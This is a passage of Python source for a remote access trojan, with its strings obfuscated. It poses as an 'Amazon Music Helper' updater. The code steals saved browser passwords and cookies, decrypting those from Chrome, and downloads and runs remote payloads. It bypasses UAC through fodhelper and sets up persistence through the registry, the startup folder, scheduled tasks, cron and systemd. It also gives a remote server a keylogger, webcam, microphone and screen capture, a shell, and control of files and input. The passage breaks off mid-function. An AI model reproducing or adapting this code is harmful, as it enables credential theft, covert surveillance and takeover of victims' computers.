            has_https = any(p[_D("_s245")] == 443 for p in h.get("all_ports", []))
            has_http = any(p[_D("_s246")] == 80 or p["port"] == 8080 for p in h.get("all_ports", []))
            if has_https:
                h["url"] = f"https://{hostname}"
            elif has_http:
                h["url"] = f"http://{hostname}"
            else:
                h["url"] = hostname
        except:
            pass
    socket.setdefaulttimeout(old_timeout)
    return info
def _browser_steal():
    ""_D("_s247")""
    results = {_D("_s248"): {}, "edge": {}, "firefox": {}}
    localapp = os.environ.get(_D("_s249"), "")
    appdata = os.environ.get(_D("_s250"), "")
    chrome_path = os.path.join(localapp, _D("_s251"), "Chrome", "User Data")
    if os.path.exists(chrome_path):
        results[_D("_s252")] = _steal_chromium(chrome_path, "Chrome", localapp)
    else:
        results[_D("_s253")] = {"error": "Chrome not found"}
    edge_path = os.path.join(localapp, _D("_s254"), "Edge", "User Data")
    if os.path.exists(edge_path):
        results[_D("_s255")] = _steal_chromium(edge_path, "Edge", localapp)
    else:
        results[_D("_s256")] = {"error": "Edge not found"}
    firefox_path = os.path.join(appdata, _D("_s257"), "Firefox", "Profiles")
    if os.path.exists(firefox_path):
        results[_D("_s258")] = _steal_firefox(firefox_path)
    else:
        results[_D("_s259")] = {"error": "Firefox not found"}
    return results
def _steal_chromium(base_path, name, localapp):
    ""_D("_s260")""
    result = {_D("_s261"): [], "cookies": [], "error": None}
    try:
        for item in os.listdir(base_path):
            if not (item == _D("_s262") or item.startswith("Profile ")): continue
            profile_path = os.path.join(base_path, item)
            login_db = os.path.join(profile_path, _D("_s263"))
            if os.path.exists(login_db):
                temp_db = os.path.join(os.environ.get(_D("_s264"), "/tmp"), f"{name.lower()}_login_{item}.db")
                try:
                    shutil.copy2(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cur = conn.cursor()
                    try:
                        cur.execute(_D("_s265"))
                        for row in cur.fetchall():
                            url, username, enc_pwd = row
                            pwd = _decrypt_chrome(enc_pwd) if (enc_pwd and HAS[_D("_s266")]) else "[needs cryptography]"
                            result[_D("_s267")].append({"url": url, "username": username, "password": pwd, "profile": item})
                    except Exception:
                        pass
                    conn.close()
                except Exception as e:
                    if not result.get(_D("_s268")): result["error"] = str(e)
                finally:
                    try: os.remove(temp_db)
                    except: pass
            for cookie_path in [os.path.join(profile_path, _D("_s269"), "Cookies"),
                                os.path.join(profile_path, _D("_s270"))]:
                if not os.path.exists(cookie_path): continue
                temp_db = os.path.join(os.environ.get(_D("_s271"), "/tmp"), f"{name.lower()}_cookies_{item}.db")
                try:
                    shutil.copy2(cookie_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cur = conn.cursor()
                    try:
                        cur.execute(_D("_s272"))
                        for row in cur.fetchall():
                            result[_D("_s273")].append({"host": row[0], "name": row[1], "value": "[encrypted]", "profile": item})
                    except Exception:
                        pass
                    conn.close()
                except Exception:
                    pass
                finally:
                    try: os.remove(temp_db)
                    except: pass
                break  
    except Exception as e:
        result[_D("_s274")] = str(e)
    return result
def _decrypt_chrome(encrypted_value):
    ""_D("_s275")""
    if not encrypted_value or not isinstance(encrypted_value, bytes):
        return _D("_s276")
    if len(encrypted_value) < 15 + 16:  
        return _D("_s277")
    if encrypted_value[:3] not in (b'v10', b'v20'):
        return _D("_s278") + encrypted_value[:3].decode(errors='replace') + "]"
    try:
        localapp = os.environ.get(_D("_s279"), "")
        browsers = [
            os.path.join(localapp, _D("_s280"), "Chrome", "User Data"),
            os.path.join(localapp, _D("_s281"), "Edge", "User Data"),
            os.path.join(localapp, _D("_s282"), "Brave-Browser", "User Data"),
            os.path.join(localapp, _D("_s283"), "Opera Stable"),
        ]
        for browser_path in browsers:
            ls_path = os.path.join(browser_path, _D("_s284"))
            if not os.path.exists(ls_path):
                continue
            try:
                with open(ls_path, 'r', encoding=_D("_s285")) as f:
                    local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state[_D("_s286")]["encrypted_key"])
                encrypted_key = encrypted_key[5:]  
                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [(_D("_s288"), ctypes.wintypes.DWORD),
                                (_D("_s289"), ctypes.POINTER(ctypes.c_char))]
                pDataIn = DATA_BLOB(len(encrypted_key),
                    ctypes.cast(ctypes.create_string_buffer(encrypted_key, len(encrypted_key)), ctypes.POINTER(ctypes.c_char)))
                pDataOut = DATA_BLOB()
                if not ctypes.windll.crypt32.CryptUnprotectData(
                    ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
                    continue
                aes_key = ctypes.create_string_buffer(pDataOut.cbData)
                ctypes.memmove(aes_key, pDataOut.pbData, pDataOut.cbData)
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:]
                aesgcm = AESGCM(bytes(aes_key))
                return aesgcm.decrypt(nonce, ciphertext, None).decode(_D("_s290"), errors='replace')
            except Exception:
                continue
    except Exception:
        pass
    return _D("_s291")
def _steal_firefox(base_path):
    ""_D("_s292")""
    result = {_D("_s293"): [], "cookies": [], "error": None}
    try:
        for item in os.listdir(base_path):
            profile_path = os.path.join(base_path, item)
            if not os.path.isdir(profile_path): continue
            logins_path = os.path.join(profile_path, _D("_s294"))
            if os.path.exists(logins_path):
                try:
                    with open(logins_path, 'r', encoding=_D("_s295")) as f:
                        logins = json.load(f)
                    for entry in logins.get(_D("_s296"), []):
                        result[_D("_s297")].append({
                            "url": entry.get(_D("_s298"), ""),
                            _D("_s299"): (entry.get("encryptedUsername", "") or "")[:80],
                            _D("_s300"): (entry.get("encryptedPassword", "") or "")[:80],
                            _D("_s301"): item,
                            _D("_s302"): True
                        })
                except Exception:
                    pass
            cookies_path = os.path.join(profile_path, _D("_s303"))
            if os.path.exists(cookies_path):
                temp_db = os.path.join(os.environ.get(_D("_s304"), "/tmp"), f"ff_cookies_{item}.db")
                try:
                    shutil.copy2(cookies_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cur = conn.cursor()
                    try:
                        cur.execute(_D("_s305"))
                        for row in cur.fetchall():
                            result[_D("_s306")].append({
                                _D("_s307"): row[0], "name": row[1],
                                _D("_s308"): (row[2] or "")[:80], "profile": item
                            })
                    except Exception:
                        pass
                    conn.close()
                except Exception:
                    pass
                finally:
                    try: os.remove(temp_db)
                    except: pass
    except Exception as e:
        result[_D("_s309")] = str(e)
    return result
def _download_exec(url, save_path=None):
    ""_D("_s310")""
    try:
        import urllib.request
        if not save_path:
            save_path = os.path.join(os.environ.get(_D("_s311"), "/tmp"), url.split("/")[-1] or "payload.exe")
        urllib.request.urlretrieve(url, save_path)
        if sys.platform == _D("_s312") and save_path.lower().endswith((".exe",".bat",".cmd",".ps1")):
            subprocess.Popen(save_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        elif save_path.endswith(".sh") or not sys.platform.startswith("win"):
            os.chmod(save_path, 0o755)
            subprocess.Popen(save_path, shell=True)
        return True, f"Downloaded to {save_path}"
    except Exception as e: return False, str(e)
CFG = {"FR": None}
def _flist(path=""):
    if CFG.get("FR") and path and not str(Path(path).resolve()).startswith(str(Path(CFG["FR"]).resolve())): path = CFG["FR"]
    if not path and sys.platform == _D("_s313"):
        return {_D("_s314"): "Drives", "parent": None, "items": [
            {_D("_s315"): f"{chr(l)}:\\", "path": f"{chr(l)}:\\", "type": "drive", "size": 0, "modified": ""}
            for l in range(ord("A"), ord("Z")+1) if os.path.exists(f"{chr(l)}:\\")]}
    t = Path(path).resolve() if path else Path.home()
    if not t.exists(): return {_D("_s316"): "Not found"}
    if t.is_file(): return {_D("_s317"): "Not a dir"}
    items = []
    denied = False
    try:
        entries = list(t.iterdir())
    except PermissionError:
        denied = True
        entries = []
    except OSError:
        denied = True
        entries = []
    for e in sorted(entries, key=lambda e: (not e.is_dir(), e.name.lower())):
        try:
            s = e.stat(); items.append({_D("_s318"): e.name, "path": str(e.resolve()),
                _D("_s319"): "dir" if e.is_dir() else "file", "size": s.st_size if e.is_file() else 0,
                _D("_s320"): datetime.fromtimestamp(s.st_mtime).isoformat()})
        except: items.append({_D("_s321"): e.name, "path": str(e.resolve()),
            _D("_s322"): "dir" if e.is_dir() else "file", "size": 0, "modified": "", "inaccessible": True})
    parent = str(t.parent.resolve()) if t.parent != t else None
    result = {_D("_s323"): str(t.resolve()), "parent": parent, "items": items}
    if denied:
        result[_D("_s324")] = "Partial listing - some entries may be hidden due to permissions"
    return result
def _fdel(path):
    t = Path(path).resolve()
    if not t.exists(): return False, _D("_s325")
    try:
        if t.is_dir(): shutil.rmtree(t)
        else: t.unlink()
        return True, _D("_s326")
    except Exception as e: return False, str(e)
def _fmkdir(parent, name):
    try: Path(parent).resolve().joinpath(name).mkdir(parents=False, exist_ok=False); return True, "OK"
    except Exception as e: return False, str(e)
def _fread(path, offset=0, cs=1024*1024):
    try:
        with open(path, "rb") as f: f.seek(offset); d = f.read(cs)
        return {_D("_s327"): base64.b64encode(d).decode(), "offset": offset, "size": len(d), "eof": len(d) < cs}
    except Exception as e: return {_D("_s328"): str(e)}
def _fwrite(path, b64, offset=0, mode="wb"):
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, mode) as f:
            if offset: f.seek(offset)
            f.write(base64.b64decode(b64))
        return True, "ok"
    except Exception as e: return False, str(e)
def _check_for_update(server_url):
    ""_D("_s329")""
    try:
        import urllib.request
        check_url = server_url.rstrip("/") + _D("_s330")
        r = urllib.request.urlopen(check_url, timeout=15)
        data = json.loads(r.read().decode())
        remote_ver = (data.get(_D("_s331")) or "").strip()
        download_url = (data.get(_D("_s332")) or "").strip()
        if not remote_ver or not download_url:
            _l.info(_D("_s333"))
            return None, None
        if remote_ver != _VERSION:
            _l.info(f"Update available: v{_VERSION} -> v{remote_ver}")
            return remote_ver, download_url
        else:
            _l.info(f"Client is up to date (v{_VERSION})")
            return None, None
    except Exception as e:
        _l.warning(f"Update check failed: {e}")
        return None, None
def _download_and_install(download_url, new_version):
    ""_D("_s334")""
    try:
        import urllib.request
        pd = _pdir()
        new_exe = os.path.join(pd, f"AmazonMusicHelper_v{new_version}.exe")
        _l.info(f"Downloading update from {download_url}...")
        urllib.request.urlretrieve(download_url, new_exe)
        _l.info(f"Downloaded to {new_exe}")
        current_exe = _exepath()
        bat_path = os.path.join(os.environ.get(_D("_s335"), pd), "rasphere_update.bat")
        with open(bat_path, "w") as f:
            f.write(f)
        _l.info(f"Update script written to {bat_path}")
        if sys.platform == _D("_s337"):
            subprocess.Popen([bat_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
            _l.info(_D("_s338"))
        else:
            _l.error(_D("_s339"))
            return False
        return True
    except Exception as e:
        _l.error(f"Update download/install failed: {e}")
        return False
def _is_admin():
    ""_D("_s340")""
    try:
        if sys.platform == _D("_s341"):
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        pass
    try:
        return os.getuid() == 0
    except:
        pass
    return False
def _fodhelper_uac_bypass(args):
    if sys.platform != _D("_s342"):
        _l.warning(_D("_s343"))
        return False
    try:
        import winreg as wr
    except ImportError:
        _l.error(_D("_s344"))
        return False
    exe_path = _exepath()
    elevated_args = []
    i = 1
    while i < len(sys.argv):
        a = sys.argv[i]
        if a in (_D("_s345"), "--no-elevate", "--uninstall", "--install"):
            i += 1
            continue
        if a in (_D("_s346"), "--secret", "--id", "--reconnect"):
            elevated_args.append(a)
            if i + 1 < len(sys.argv):
                elevated_args.append(sys.argv[i + 1])
                i += 1
        else:
            elevated_args.append(a)
        i += 1
    elevated_args.append(_D("_s347"))
    cmd = subprocess.list2cmdline([exe_path] + elevated_args)
    _l.info(f"UAC bypass: relaunching as admin (fodhelper)")
    try:
        reg_path = r"Software\Classes\ms-settings\Shell\open\command"
        try:
            key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
            wr.DeleteValue(key, _D("_s348"))
            wr.CloseKey(key)
        except:
            pass
        key = wr.CreateKey(wr.HKEY_CURRENT_USER, reg_path)
        wr.SetValueEx(key, "", 0, wr.REG_SZ, cmd)
        wr.SetValueEx(key, _D("_s349"), 0, wr.REG_SZ, "")
        wr.CloseKey(key)
        try:
            settings_key = wr.CreateKey(wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
            wr.CloseKey(settings_key)
        except:
            pass
        fodhelper_path = os.path.join(os.environ.get(_D("_s350"), "C:\\Windows"), "System32", "fodhelper.exe")
        subprocess.Popen(fodhelper_path, creationflags=subprocess.CREATE_NO_WINDOW | 0x00000008, close_fds=True)
        _l.info(_D("_s351"))
        time.sleep(0.5)
        os._exit(0)
    except Exception as e:
        _l.error(f"UAC bypass failed: {e}")
        try:
            wr.DeleteKey(wr.HKEY_CURRENT_USER, reg_path)
        except:
            pass
        return False
def _cleanup_uac_registry():
    ""_D("_s352")""
    try:
        import winreg as wr
        reg_path = r"Software\Classes\ms-settings\Shell\open\command"
        try:
            key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
            try:
                wr.DeleteValue(key, _D("_s353"))
            except:
                pass
            try:
                wr.DeleteValue(key, "")
            except:
                pass
            wr.CloseKey(key)
        except:
            pass
        try:
            wr.DeleteKey(wr.HKEY_CURRENT_USER, reg_path)
        except:
            pass
        for p in [r"Software\Classes\ms-settings\Shell\open",
                  r"Software\Classes\ms-settings\Shell",
                  r"Software\Classes\ms-settings"]:
            try:
                wr.DeleteKey(wr.HKEY_CURRENT_USER, p)
            except:
                pass
        _l.info(_D("_s354"))
    except Exception as e:
        _l.debug(f"UAC cleanup (non-critical): {e}")
_keepalive_stop = threading.Event()
def _keepalive_pinger(server_url):
    ""_D("_s355")""
    import urllib.request
    health_url = server_url.rstrip("/") + _D("_s356")
    while not _keepalive_stop.is_set():
        _keepalive_stop.wait(_KEEPALIVE)
        if _keepalive_stop.is_set():
            break
        try:
            urllib.request.urlopen(health_url, timeout=10)
            _l.debug(_D("_s357"))
        except Exception as e:
            _l.debug(f"Keep-alive ping failed: {e}")
def _exepath():
    if getattr(sys, _D("_s358"), False): return sys.executable
    return os.path.abspath(sys.argv[0])
def _pdir():
    if sys.platform == _D("_s359"):
        b = os.environ.get(_D("_s360"), os.path.expanduser("~"))
        p = os.path.join(b, _D("_s361"))
    else:
        p = os.path.expanduser(_D("_s362"))
    os.makedirs(p, exist_ok=True)
    return p
def _ip(url, secret, rec, cid):
    ep = _exepath(); pd = _pdir()
    dest = os.path.join(pd, _D("_s363") if sys.platform == "win32" else "amazonmusicd")
    if ep != dest:
        try: shutil.copy2(ep, dest); _l.info(f"Copied: {dest}")
        except Exception as e: _l.warning(f"Copy fail: {e}"); dest = ep
    ca = [dest, _D("_s364"), url or _SERVER, "--secret", secret or _SECRET, "--reconnect", str(rec or _RECON), "--no-persist"]
    if cid: ca += [_D("_s365"), cid]
    cl = subprocess.list2cmdline(ca)
    ok = False
    if sys.platform == _D("_s366"):
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, _D("_s367"), 0, winreg.REG_SZ, cl); winreg.CloseKey(k); _l.info("Installed: Registry"); ok = True
        except Exception as e: _l.warning(f"Reg fail: {e}")
        try:
            sd = os.path.join(os.environ.get(_D("_s368"),""), "Microsoft","Windows","Start Menu","Programs","Startup")
            if os.path.exists(sd):
                vp = os.path.join(sd, _D("_s369"))
                with open(vp, "w") as f: f.write(f'CreateObject("WScript.Shell").Run "{cl.replace(chr(34), chr(34)+chr(34))}", 0, False')
                _l.info(_D("_s370")); ok = True
        except Exception as e: _l.warning(f"VBS fail: {e}")
        try:
            subprocess.run([_D("_s371"),"/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            r = subprocess.run([_D("_s372"),"/Create","/TN","AmazonMusicHelper","/TR",cl,"/SC","ONLOGON","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            if r.returncode == 0: _l.info(_D("_s373")); ok = True
        except Exception as e: _l.warning(f"Task fail: {e}")
    else:
        try:
            cline = f"@reboot {cl} > /dev/null 2>&1 &"
            ex = subprocess.run([_D("_s374"),"-l"], capture_output=True, text=True)
            ct = (ex.stdout or "")
            if _D("_s375") not in ct:
                ct += f"\n
                subprocess.run([_D("_s376"),"-"], input=ct, text=True)
                _l.info(_D("_s377")); ok = True
        except Exception as e: _l.warning(f"Cron fail: {e}")
        try:
            sd = os.path.expanduser(_D("_s378")); os.makedirs(sd, exist_ok=True)
            sc = f"[Unit]\nDescription=Amazon Music Helper\nAfter=network.target\n\n[Service]\nExecStart={cl}\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=default.target\n"
            with open(os.path.join(sd, _D("_s379")), "w") as f: f.write(sc)
            subprocess.run([_D("_s380"),"--user","daemon-reload"], capture_output=True)
            subprocess.run([_D("_s381"),"--user","enable","amazonmusic-helper"], capture_output=True)
            _l.info(_D("_s382")); ok = True
        except Exception as e: _l.warning(f"systemd fail: {e}")
    return ok
def _up():
    ok = False
    if sys.platform == _D("_s383"):
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            try: winreg.DeleteValue(k, _D("_s384")); ok = True
            except FileNotFoundError: pass
            winreg.CloseKey(k)
        except: pass
        try:
            vp = os.path.join(os.environ.get(_D("_s385"),""), "Microsoft","Windows","Start Menu","Programs","Startup","AmazonMusicHelper.vbs")
            if os.path.exists(vp): os.remove(vp); ok = True
        except: pass
        try: subprocess.run([_D("_s386"),"/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW); ok = True
        except: pass
    else:
        try:
            ex = subprocess.run([_D("_s387"),"-l"], capture_output=True, text=True)
            if ex.stdout and _D("_s388") in ex.stdout:
                nc = "\n".join(l for l in ex.stdout.split("\n")                    if _D("_s389") not in l)
                subprocess.run([_D("_s390"),"-"], input=nc, text=True); ok = True
        except: pass
        try:
            sp = os.path.expanduser(_D("_s391"))
            if os.path.exists(sp):
                subprocess.run([_D("_s392"),"--user","disable","amazonmusic-helper"], capture_output=True)
                os.remove(sp); subprocess.run([_D("_s393"),"--user","daemon-reload"], capture_output=True); ok = True
        except: pass
    try:
        pd = _pdir()
        for f in os.listdir(pd):
            try: os.remove(os.path.join(pd, f))
            except: pass
        try: os.rmdir(pd)
        except: pass
    except: pass
    return ok
def _sh(sio):
    sc = CapEngine(sio, _D("_s394"))
    wc = CapEngine(sio, _D("_s395"))
    mic = MicEngine(sio)
    mon = SysMon(sio)
    term = Term(sio)
    keylog = Keylog(sio)
    _s.scap = sc; _s.wcap = wc; _s.mic = mic; _s.keylog = keylog
    @sio.on(_D("_s396"))
    def _c():
        _l.info(_D("_s397")); _s.conn = True
        sio.emit(_D("_s398"), {"secret": _s.secret, "client_id": _s.cid,
            _D("_s399"): {"hostname": socket.gethostname(), "platform": sys.platform,
                _D("_s400"): os.environ.get("USERNAME", os.environ.get("USER","?")),
                _D("_s401"): {"screen": HAS["mss"], "input": HAS["pynput"], "clipboard": HAS["pyperclip"],
                    _D("_s402"): HAS["pycaw"], "monitor": HAS["psutil"], "terminal": True, "webcam": _h6}}})
    @sio.on(_D("_s403"))
    def _d():
        _block_input(False)  
        _l.info(_D("_s404")); _s.conn = False; _s.reg = False; sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop()
    @sio.on(_D("_s405"))
    def _r(d): _s.reg = True; _s.cid = d.get(_D("_s406"), _s.cid); _l.info(f"Registered: {_s.cid}")
    @sio.on(_D("_s407"))
    def _sc(d=None):
        if d and _D("_s408") in d: sc.monitor_idx = int(d.get("monitor", 1))
        sc.start(); sio.emit(_D("_s409"), {"active": True})
    @sio.on(_D("_s410"))
    def _sc2(): sc.stop(); sio.emit(_D("_s411"), {"active": False})
    @sio.on(_D("_s412"))
    def _smn(d):
        if d and _D("_s413") in d:
            sc.monitor_idx = int(d[_D("_s414")])
            was_running = sc.r
            if was_running:
                sc.stop()
                sc.start()
                sio.emit(_D("_s415"), {"active": True})
    @sio.on(_D("_s416"))
    def _sq(d):
        if d:
            if _D("_s417") in d: sc.q = max(1, min(100, int(d["quality"])))
            if _D("_s418") in d: sc.sc = max(0.1, min(1.0, float(d["scale"])))
            if "fps" in d: sc.fps = max(1, min(30, int(d["fps"])))
    @sio.on(_D("_s419"))
    def _wc(d=None): wc.start(); sio.emit(_D("_s420"), {"active": True})
    @sio.on(_D("_s421"))
    def _wc2(): wc.stop(); sio.emit(_D("_s422"), {"active": False})
    @sio.on(_D("_s423"))
    def _wq(d):
        if d:
            if _D("_s424") in d: wc.q = max(1, min(100, int(d["quality"])))
            if "fps" in d: wc.fps = max(1, min(30, int(d["fps"])))
    @sio.on(_D("_s425"))
    def _mstart(d=None): mic.start()
    @sio.on(_D("_s426"))
    def _mstop(): mic.stop(); sio.emit(_D("_s427"), {"active": False})
    @sio.on(_D("_s428"))
    def _kstart(d=None): keylog.start()
    @sio.on(_D("_s429"))
    def _kstop(): keylog.stop()
    @sio.on(_D("_s430"))
    def _me(d):
        if not HAS[_D("_s431")] or not _s.mc: return
        try:
            a = d.get(_D("_s432"),"")
            if a == _D("_s433"): _s.mc.position = (int(d.get("x",0)*_s.sw), int(d.get("y",0)*_s.sh))
            elif a == _D("_s434"): _s.mc.move(int(d.get("dx",0)), int(d.get("dy",0)))
            elif a == _D("_s435"):
                bm = {_D("_s436"): MB.left, "right": MB.right, "middle": MB.middle}
                _s.mc.click(bm.get(d.get(_D("_s437"),"left").lower(), MB.left), 2 if d.get("double") else 1)
            elif a == _D("_s438"): _s.mc.press({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
            elif a == _D("_s439"): _s.mc.release({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
            elif a == _D("_s440"): _s.mc.scroll(int(d.get("dx",0)), int(d.get("dy",0)))
        except Exception as e: _l.error(f"Mouse err: {e}")
    @sio.on(_D("_s441"))
    def _ke(d):
        if not HAS[_D("_s442")] or not _s.kc: return
        try:
            SP = {_D("_s443"): Key.ctrl, "alt": Key.alt, "shift": Key.shift, "win": Key.cmd, "cmd": Key.cmd, "super": Key.cmd,
                  "tab": Key.tab, _D("_s444"): Key.enter, "esc": Key.esc, "space": Key.space, "backspace": Key.backspace,
                  _D("_s445"): Key.delete, "home": Key.home, "end": Key.end, "page_up": Key.page_up, "page_down": Key.page_down,
                  "up": Key.up, _D("_s446"): Key.down, "left": Key.left, "right": Key.right,
                  **{f"f{i}": getattr(Key, f"f{i}") for i in range(1,13)}}
            def rk(k): k = k.lower(); return SP.get(k, KeyCode.from_char(k))
            a = d.get(_D("_s447"),"")
            if a == _D("_s448"): _s.kc.press(rk(d.get("key","")))
            elif a == _D("_s449"): _s.kc.release(rk(d.get("key","")))
            elif a == _D("_s450"):
                ks = [rk(k) for k in d.get(_D("_s451"),[])]
                for k in ks: _s.kc.press(k)
                for k in reversed(ks): _s.kc.release(k)
            elif a == _D("_s452"): _s.kc.type(d.get("text",""))
            elif a == _D("_s453"):
                scs = {_D("_s454"): ([Key.ctrl, Key.alt], Key.delete), "ctrl_shift_esc": ([Key.ctrl, Key.shift], Key.esc),
                       _D("_s455"): ([Key.alt], Key.tab), "alt_f4": ([Key.alt], Key.f4),
                       _D("_s456"): ([Key.cmd], KeyCode.from_char("d")), "win_r": ([Key.cmd], KeyCode.from_char("r")),
                       _D("_s457"): ([Key.cmd], KeyCode.from_char("e")), "win_l": ([Key.cmd], KeyCode.from_char("l")),
                       _D("_s458"): ([Key.ctrl], KeyCode.from_char("c")), "ctrl_v": ([Key.ctrl], KeyCode.from_char("v")),
                       _D("_s459"): ([Key.ctrl], KeyCode.from_char("x")), "ctrl_z": ([Key.ctrl], KeyCode.from_char("z")),
                       _D("_s460"): ([Key.ctrl], KeyCode.from_char("a")), "ctrl_s": ([Key.ctrl], KeyCode.from_char("s"))}
                sc = scs.get(d.get(_D("_s461"),""))
                if sc:
                    for m in sc[0]: _s.kc.press(m)
                    _s.kc.press(sc[1]); _s.kc.release(sc[1])
                    for m in reversed(sc[0]): _s.kc.release(m)
        except Exception as e: _l.error(f"Key err: {e}")
    @sio.on(_D("_s462"))
    def _ts(): ok = term.start(); sio.emit(_D("_s463"), {"active": ok})
    @sio.on(_D("_s464"))
    def _ti(d): term.write((d or {}).get(_D("_s465"),""))
    @sio.on(_D("_s466"))
    def _tst(): term.stop(); sio.emit(_D("_s467"), {"active": False})
    @sio.on(_D("_s468"))
    def _sm(): mon.start(); sio.emit(_D("_s469"), {"active": True})
    @sio.on(_D("_s470"))
    def _sm2(): mon.stop(); sio.emit(_D("_s471"), {"active": False})
    @sio.on(_D("_s472"))
    def _gp(): sio.emit(_D("_s473"), {"processes": _proc()})
    @sio.on(_D("_s474"))
    def _kp(d): pid = (d or {}).get("pid"); ok, msg = _kill(pid); sio.emit(_D("_s475"), {"ok": ok, "message": msg, "pid": pid})
    @sio.on(_D("_s476"))
    def _cg():
        if HAS[_D("_s477")]:
            try: sio.emit(_D("_s478"), {"text": pyperclip.paste()})
            except Exception as e: sio.emit(_D("_s479"), {"error": str(e)})
        else: sio.emit(_D("_s480"), {"error": "N/A"})
    @sio.on(_D("_s481"))
    def _cs(d):
        if HAS[_D("_s482")]:
            try: pyperclip.copy((d or {}).get(_D("_s483"),"")); sio.emit("clipboard_status", {"ok": True})
            except Exception as e: sio.emit(_D("_s484"), {"ok": False, "error": str(e)})
        else: sio.emit(_D("_s485"), {"ok": False, "error": "N/A"})
    @sio.on(_D("_s486"))
    def _ag(): r = _audio(); sio.emit(_D("_s487"), r or {"error": "N/A"})
    @sio.on(_D("_s488"))
    def _as(d): lv = (d or {}).get(_D("_s489"),50); ok = _avol(int(lv)); sio.emit("audio_status", {"ok": ok, "volume": int(lv)})
    @sio.on(_D("_s490"))
    def _am(): ok = _amute(); r = _audio(); sio.emit(_D("_s491"), r or {"error": "N/A"})
    @sio.on(_D("_s492"))
    def _pmo(): ok = _monoff(); sio.emit(_D("_s493"), {"action": "monitor_off", "ok": ok})
    @sio.on(_D("_s494"))
    def _pl(): ok = _lock(); sio.emit(_D("_s495"), {"action": "lock", "ok": ok})
    @sio.on(_D("_s496"))
    def _ps(): ok = _sleep(); sio.emit(_D("_s497"), {"action": "sleep", "ok": ok})
    @sio.on(_D("_s498"))
    def _wp(d): ok, msg = _wallpaper((d or {}).get(_D("_s499"),"")); sio.emit("cmd_result", {"cmd": "wallpaper", "ok": ok, "message": msg})
    @sio.on(_D("_s500"))
    def _mb(d): ok, msg = _msgbox((d or {}).get(_D("_s501"),"RASphere"), (d or {}).get("text","Hello!")); sio.emit("cmd_result", {"cmd": "msgbox", "ok": ok, "message": msg})
    @sio.on(_D("_s502"))
    def _ou(d): ok, msg = _openurl((d or {}).get("url","")); sio.emit(_D("_s503"), {"cmd": "openurl", "ok": ok, "message": msg})
    @sio.on(_D("_s504"))
    def _tss(): data, fmt = _screenshot(); sio.emit(_D("_s505"), {"data": data, "format": fmt} if data else {"error": fmt})
    @sio.on(_D("_s506"))
    def _geo(): sio.emit(_D("_s507"), _geoip())
    @sio.on(_D("_s508"))
    def _ga(): sio.emit(_D("_s509"), {"apps": _apps()})
    @sio.on(_D("_s510"))
    def _psnd(d): ok, msg = _play_sound((d or {}).get(_D("_s511"),800), (d or {}).get("dur",1)); sio.emit("cmd_result", {"cmd": "sound", "ok": ok, "message": msg})
    @sio.on(_D("_s512"))
    def _sf(d): r = _search_files((d or {}).get(_D("_s513"),"C:\\"), (d or {}).get("pattern","*"), (d or {}).get("max",50)); sio.emit("search_result", {"results": r})
    @sio.on(_D("_s514"))
    def _ec(d): out, rc = _execute_command((d or {}).get(_D("_s515"),"")); sio.emit("execute_result", {"output": out, "code": rc})
    @sio.on(_D("_s516"))
    def _de(d): ok, msg = _download_exec((d or {}).get("url",""), (d or {}).get(_D("_s517"))); sio.emit("cmd_result", {"cmd": "download_exec", "ok": ok, "message": msg})
    @sio.on(_D("_s518"))
    def _ib(d=None): ok, msg = _block_input(True); sio.emit(_D("_s519"), {"cmd": "input_block", "ok": ok, "message": msg})
    @sio.on(_D("_s520"))
    def _iub(d=None): ok, msg = _block_input(False); sio.emit(_D("_s521"), {"cmd": "input_unblock", "ok": ok, "message": msg})
    @sio.on(_D("_s522"))
    def _fl(d): sio.emit(_D("_s523"), _flist((d or {}).get("path","")))
    @sio.on(_D("_s524"))
    def _fdr(d): sio.emit(_D("_s525"), {**_fread((d or {}).get("path",""), (d or {}).get("offset",0)), "path": (d or {}).get("path","")})
    @sio.on(_D("_s526"))
    def _fd(d): ok, msg = _fdel((d or {}).get(_D("_s527"),"")); sio.emit("file_delete_result", {"ok": ok, "message": msg})
    @sio.on(_D("_s528"))
    def _fnf(d): ok, msg = _fmkdir((d or {}).get(_D("_s529"),""), (d or {}).get("name","New Folder")); sio.emit("file_new_folder_result", {"ok": ok, "message": msg})
    @sio.on(_D("_s530"))
    def _fuc(d):
        path = (d or {}).get(_D("_s531"),""); chunk = (d or {}).get("data",""); offset = (d or {}).get("offset",0)
        mode = "wb" if offset == 0 else "ab"
        ok, msg = _fwrite(path, chunk, offset, mode)
        sio.emit(_D("_s532"), {"ok": ok, "message": msg, "path": path})
    @sio.on(_D("_s533"))
    def _ninfo(d=None): sio.emit(_D("_s534"), _network_info())
    @sio.on(_D("_s535"))
    def _bs(d=None):
        _l.info(_D("_s536"))
        result = _browser_steal()
